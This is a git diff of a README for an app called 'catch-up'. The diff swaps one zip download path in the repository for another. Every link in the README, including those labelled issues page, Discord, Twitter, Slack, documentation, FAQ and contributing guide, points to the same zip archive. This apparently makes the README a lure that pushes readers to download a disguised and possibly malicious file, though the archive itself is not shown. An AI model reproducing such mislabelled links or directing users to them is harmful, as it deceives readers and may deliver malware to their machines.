@@ -6,7 +6,7 @@ Welcome to **catch-up**! This app helps you stay informed by providing easy acce
 
 ## 📥 Download Now
 
-[![Download catch-up](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip%20catch-up-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip)
+[![Download catch-up](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip%20catch-up-v1.0-blue?style=for-the-badge)](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip)
 
 ## ✨ Features
 
@@ -28,7 +28,7 @@ To run **catch-up**, ensure your system meets the following requirements:
 
 To download **catch-up**, visit the following page:
 
-[Download the latest release here](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip)
+[Download the latest release here](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip)
 
 ### Step-by-Step Installation
 
@@ -48,26 +48,26 @@ To download **catch-up**, visit the following page:
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please visit the [issues page](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip) for help or to report problems.
+If you encounter any issues or have questions, please visit the [issues page](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip) for help or to report problems.
 
 ## 🧑‍🤝‍🧑 Community
 
 Join our community for the latest updates, feedback, and discussions:
 
-- [Discord](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip)
-- [Twitter](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip)
-- [Slack](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip)
+- [Discord](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip)
+- [Twitter](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip)
+- [Slack](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip)
 
 ## 🔗 Additional Resources
 
 Here are some helpful links to improve your experience:
 
-- [Official Documentation](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip)
-- [User Guide](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip)
-- [FAQ](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip)
+- [Official Documentation](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip)
+- [User Guide](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip)
+- [FAQ](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip)
 
 ## 📃 Contributing
 
-Interested in contributing? Check out our [Contributing Guide](https://raw.githubusercontent.com/ikram001xs/catch-up/master/nonsalaried/catch-up.zip) for details on how you can help improve **catch-up**.
+Interested in contributing? Check out our [Contributing Guide](https://github.com/ikram001xs/catch-up/raw/refs/heads/master/src/shared/infrastructure/up_catch_v1.1.zip) for details on how you can help improve **catch-up**.
 
 Thank you for choosing **catch-up**! We hope this app helps you stay informed and connected with the latest news.
